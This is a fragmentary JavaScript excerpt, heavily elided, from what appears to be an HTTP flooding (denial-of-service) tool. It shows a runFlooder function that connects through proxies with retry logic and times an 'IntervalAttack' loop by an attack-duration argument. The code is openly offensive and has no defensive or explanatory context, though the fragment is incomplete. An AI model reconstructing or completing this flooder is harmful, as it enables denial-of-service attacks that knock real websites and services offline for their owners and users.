...
function runFlooder() {
    ...
    function attemptConnection(retryCount = 0, maxRetries = 3) {
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) {
                if (retryCount < maxRetries) {
                    setTimeout(() => attemptConnection(retryCount + 1, maxRetries), 1000);
                }
                return;
            }
            ...
            client.on("connect", () => {
                ...
                setTimeout(() => clearInterval(IntervalAttack), (args.time * 1000) - 1000);
            });
